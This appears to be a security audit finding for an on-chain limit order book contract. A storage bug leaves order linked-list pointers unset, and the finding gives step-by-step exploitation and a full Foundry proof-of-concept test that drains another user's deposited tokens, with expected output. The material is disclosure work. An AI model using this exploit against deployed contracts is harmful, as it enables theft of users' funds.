  "body": "## Finding description and impact\n\nIf an order is posted and another order already exists at the same price, the prevId and nextId fields are not updated, which completely breaks the linked list.\nIn the CLOB contract, when a user submits a limit order, it is added to the book by calling BookLib.addOrderToBook.\n```solidity\n        ds.addOrderToBook(newOrder);\n\n```\n\nThis function creates the order and then updates the price level (limit) as follows:\n\n```solidity\n  /// @dev Adds a limit order to the book\n    function addOrderToBook(Book storage self, Order memory order) internal {\n\n        Limit storage limit = _updateBookPostOrder(self, order);\n        _updateLimitPostOrder(self, limit, order);\n    }\n```\nIf an order already exists at that price, it updates tailOrder.\nIt also sets the prevOrderId and nextOrderId of the new order.\n```solidity\n  function _updateLimitPostOrder(Book storage self, Limit storage limit, Order memory order) private {\n        limit.numOrders++;\n\n        if (limit.headOrder.isNull()) {\n            limit.headOrder = order.id;\n            limit.tailOrder = order.id;\n        } else {\n            Order storage tailOrder = self.orders[limit.tailOrder];\n            tailOrder.nextOrderId = order.id;\n            order.prevOrderId = tailOrder.id;\n            limit.tailOrder = order.id;\n        }\n\n        emit LimitOrderCreated(BookEventNonce.inc(), order.id, order.price, order.amount, order.side);\n    }\n```\n\nThe issue is that the order stored in storage is never updated—the changes occur only in memory, as indicated by the function signature.\n\nAs a result, the linked list becomes invalid after the call: the order’s prevOrderId and nextOrderId both remain zero. This is dangerous because it can create a discrepancy between the price applied and the actual price of an order when the CLOB matches orders, as shown in the PoC.\n\n## Recommended mitigation steps\n\nThe protocol should update the prevOrderId and the nextOrderId.",
  "proof_of_concept": "#### Goal\nDemonstrate how an attacker can exploit the linked-list bug to steal other users’ funds.\n\n#### scenario\n\nInitial state: \nJulien has deposited 28 091.6458 tokenA in the account manager. \n\n\nJB will attempt to steal Julien’s funds through the following steps:  \n\nStep 1:\n\nJB creates two BUY limit orders, each for 0.005 WETH at a price of 2 012 tokenA.\nBecause of the bug:\nThe second order is created with prevOrderId and nextOrderId set to zero.\nThe first order’s nextOrderId is incorrectly set to 2.\nKeep this detail in mind for later.\n\nStep 2: \n\nJB amends order 2,:\n\nchanging:\n\nPrice → 3.7293 tokenA (down from 2 012).\n\nAmount → 14 WETH.\n\nDue to the broken linked list, both headOrder and tailOrder for the 3.7293 limit are reset to 0 (see BookLib L-320).\n\n```solidity\n        OrderId prev = order.prevOrderId;\n        OrderId next = order.nextOrderId;\n\n        if (!prev.isNull()) self.orders[prev].nextOrderId = next;\n        else limit.headOrder = next;\n\n        if (!next.isNull()) self.orders[next].prevOrderId = prev;\n        else limit.tailOrder = prev;\n```\nStep 3: \n\nJB places a third BUY limit order for 0.005 WETH at 2 012 tokenA, the purpose is increasing numOrders for the 2 012 price limit.\n\nStep 4: \nJB cancels order 1.\nBecause this cancellation updates the 2 012 limit:\nheadOrder is now incorrectly set to order 2, since nextOrderId of order 1 pointed to 2.\nThis is illogical, because order 2’s price is 3.7293 tokenA after the amendment.\n\nStep 5: \nJB submits a SELL limit order for 463.132354745922055692 WETH at 1 433.7526 tokenA—large enough to match the “best bid.”\nthe best bid price is 2 012 tokenA (highest price in the book).\nIt selects order 2 as the headOrder, but mistakenly uses 2 012 tokenA as its price instead of the true 3.7293 tokenA as we can see here in the CLOB contract (L-780):\n\n```solidity\n    uint256 bestBidPrice = ds.getBestBidPrice();\n    while (bestBidPrice >= incomingOrder.price && incomingOrder.amount > 0) {\n            Limit storage limit = ds.bidLimits[bestBidPrice];\n            Order storage bestBidOrder = ds.orders[limit.headOrder];\n            ...\n             __MatchData__ memory currMatch =\n                _matchIncomingOrder(ds, bestBidOrder, incomingOrder, bestBidPrice, amountIsBase);\n\n```\nResult : JB receives an excessive amount of quote tokens, profiting from the price discrepancy.\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {PoCTestBase} from \"./PoCTestBase.t.sol\";\nimport {GTERouter} from \"contracts/router/GTERouter.sol\";\nimport \"forge-std/console.sol\";\nimport {Operator,OperatorRoles} from \"contracts/utils/Operator.sol\";\nimport {OperatorHelperLib,IOperator} from \"contracts/utils/types/OperatorHelperLib.sol\";\nimport {ICLOB,Side, CLOB,Order,Limit,OrderId} from \"contracts/clob/CLOB.sol\";\nimport {UpgradeableBeacon} from \"@openzeppelin/proxy/beacon/UpgradeableBeacon.sol\";\nimport {SafeTransferLib} from \"@solady/utils/SafeTransferLib.sol\";\n\ncontract PoC is PoCTestBase {\n  function test_submissionValidity() external {\n     //  console.log(\"number %18e\", uint256(2**60));\n        tokenA.mint(julien,28091645800000000000000);\n         vm.startPrank(julien);\n        tokenA.approve(address(accountManager), 28091645800000000000000);\n        accountManager.deposit(julien, address(tokenA), 28091645800000000000000);\n        vm.stopPrank();\n        console.log(\"tokenA balance of julien %18e tokenA\",  accountManager.getAccountBalance(julien, address(tokenA)));\n\n        weth.mint(jb, 463132354745922055692);\n        tokenA.mint(jb, 400000 ether);\n        vm.startPrank(jb);\n        weth.approve(address(accountManager), 463132354745922055692);\n        accountManager.deposit(jb, address(weth), 463132354745922055692);\n        tokenA.approve(address(accountManager), 400000 ether);\n        accountManager.deposit(jb, address(tokenA), 400000 ether);\n        ICLOB.PostLimitOrderResult memory limitOrderResultFirst= ICLOB(wethCLOB).postLimitOrder(jb, ICLOB.PostLimitOrderArgs({\n            amountInBase: 0.005 ether,\n            price: 2012 ether,\n            cancelTimestamp: 0,\n            side: Side.BUY,\n            clientOrderId: 0,\n            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        }));\n\n       ICLOB.PostLimitOrderResult memory limitOrderResult = ICLOB(wethCLOB).postLimitOrder(jb, ICLOB.PostLimitOrderArgs({\n            amountInBase: 0.005 ether,\n            price: 2012 ether,\n            cancelTimestamp: 0,\n            side: Side.BUY,\n            clientOrderId: 0,\n            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        }));\n      Order memory order= CLOB(wethCLOB).getOrder(limitOrderResult.orderId);\n      \n        assertEq(order.prevOrderId.unwrap(), 0, \"prevOrderId should be 0\");\n        assertEq(order.nextOrderId.unwrap(), 0, \"nextOrderId should be 0\");\n        uint256 amountInQuoteOrder2 = ICLOB(wethCLOB).getQuoteTokenAmount(2012 ether,0.005 ether);\n        console.log(\"amount in quote paid by jb in creation: %18e\", amountInQuoteOrder2);\n        console.log(\"amount before amend: %18e\", uint256(14000000000000000000));\n        console.log(\"price before amend: %18e \\n\", uint256(3729300000000000000));\n\n        Limit memory limit=  CLOB(wethCLOB).getLimit( 2012 ether,Side.BUY);\n        console.log(\"headOrder of 2012 price after the creation of the two calls: %s\", limit.headOrder.unwrap());\n        console.log(\"tailOrder of 2012 price after the creation of the two calls: %s \\n\", limit.tailOrder.unwrap());\n      (int256 tempQuoteDelta,) = ICLOB(wethCLOB).amend(jb, ICLOB.AmendArgs({\n            orderId: limitOrderResult.orderId,\n            amountInBase: 14 ether,\n            price:3.7293 ether,\n            cancelTimestamp: 0,\n            side: Side.BUY,\n            limitOrderType: ICLOB.LimitOrderType.POST_ONLY\n        }));\n        // amountInQuoteOrder2 = ICLOB(wethCLOB).getQuoteTokenAmount(3.7293 ether,14 ether);\n        console.log(\"total amount in quote paid by jb after amend for the order 2: %18e tokenA \\n\", ICLOB(wethCLOB).getQuoteTokenAmount(3.7293 ether,14 ether));\n        order= CLOB(wethCLOB).getOrder(limitOrderResult.orderId);\n        //We cache the two limits after the amend\n        Limit memory limitSecond=  CLOB(wethCLOB).getLimit( 3.7293 ether,Side.BUY);\n        limit=  CLOB(wethCLOB).getLimit( 2012 ether,Side.BUY);\n\n        console.log(\"headOrder of 2012 price after the amend of the order two: %s\", limit.headOrder.unwrap());\n        console.log(\"tailOrder of 2012 price after the amend of the order two: %s \\n\", limit.tailOrder.unwrap());\n        console.log(\"headOrder of 3.7293 price after the amend of the order two: %s\", limitSecond.headOrder.unwrap());\n        console.log(\"tailOrder of 3.7293 price after the amend of the order two: %s \\n\", limitSecond.tailOrder.unwrap());\n\n      \n\n        ICLOB(wethCLOB).postLimitOrder(jb, ICLOB.PostLimitOrderArgs({\n            amountInBase:0.005 ether,\n            price: 2012 ether,\n            cancelTimestamp: 0,\n            side: Side.BUY,\n            clientOrderId: 0,\n            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        }));\n        limit=  CLOB(wethCLOB).getLimit( 2012 ether,Side.BUY);\n        console.log(\"headOrder of 2012 price after the creation of the order three: %s\", limit.headOrder.unwrap());\n        console.log(\"tailOrder of 2012 price after the creation of the order three: %s \\n\", limit.tailOrder.unwrap());\n  uint256[] memory orderIdsArg = new uint256[](1) ;\n        orderIdsArg[0] = limitOrderResultFirst.orderId;\n\n        ICLOB(wethCLOB).cancel(jb, ICLOB.CancelArgs({\n            orderIds: orderIdsArg\n        }));\n         limit=  CLOB(wethCLOB).getLimit( 2012 ether,Side.BUY);\n        console.log(\"headOrder of 2012 price after the cancel of the order one: %s\", limit.headOrder.unwrap());\n        console.log(\"tailOrder of 2012 price after the cancel of the order one: %s \\n\", limit.tailOrder.unwrap());\n\n     ICLOB.PostLimitOrderResult memory limitOrderResultFinal= ICLOB(wethCLOB).postLimitOrder(jb, ICLOB.PostLimitOrderArgs({\n            amountInBase:463132354745922055692,\n            price: 1433.7526 ether,\n            cancelTimestamp: 0,\n            side: Side.SELL,\n            clientOrderId: 0,\n            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        }));\n        console.log(\"tokenA received by jb: %18e tokenA\", limitOrderResultFinal.quoteTokenAmountTraded);\n\n        accountManager.withdraw(jb, address(tokenA), accountManager.getAccountBalance(jb, address(tokenA)));\n\n        vm.stopPrank();\n        uint256 julienBalance = accountManager.getAccountBalance(julien, address(tokenA));\n        uint256 balanceOfAccountManager = tokenA.balanceOf(address(accountManager));\n        // here we assert than indeed the balance of julien is higher than the balance of the account manager and therefore jb effectively solded julien's tokens. \n        assertGt(julienBalance, balanceOfAccountManager, \"julien balance is higher than tokenA in the account manager\");\n       console.log(\"julien balance of tokenA: %18e tokenA\", julienBalance);\n        console.log(\"balance of the account manager: %18e tokenA\", balanceOfAccountManager);\n        vm.expectRevert(SafeTransferLib.TransferFailed.selector);\n        vm.startPrank(julien);\n        accountManager.withdraw(julien, address(tokenA), julienBalance);\n        vm.stopPrank();\n        \n        \n  }\n```\n\nYou should have this output: \n\n```\nRan 1 test for test/c4-poc/PoC.t.sol:PoC\n[PASS] test_submissionValidity() (gas: 1459620)\nLogs:\n  tokenA balance of julien 28091.6458 tokenA\n  amount in quote paid by jb in creation: 10.06\n  amount before amend: 14\n  price before amend: 3.7293 \n\n  headOrder of 2012 price after the creation of the two calls: 1\n  tailOrder of 2012 price after the creation of the two calls: 2 \n\n  total amount in quote paid by jb after amend for the order 2: 52.2102 tokenA \n\n  headOrder of 2012 price after the amend of the order two: 0\n  tailOrder of 2012 price after the amend of the order two: 0 \n\n  headOrder of 3.7293 price after the amend of the order two: 2\n  tailOrder of 3.7293 price after the amend of the order two: 2 \n\n  headOrder of 2012 price after the creation of the order three: 3\n  tailOrder of 2012 price after the creation of the order three: 3 \n\n  headOrder of 2012 price after the cancel of the order one: 2\n  tailOrder of 2012 price after the cancel of the order one: 3 \n\n  tokenA received by jb: 28168 tokenA\n  julien balance of tokenA: 28091.6458 tokenA\n  balance of the account manager: 0 tokenA\n```\n\nAt the end, the account manager’s balance is completely drained: JB has received all the tokenA, and when Julien tries to withdraw his funds, the transaction reverts.",
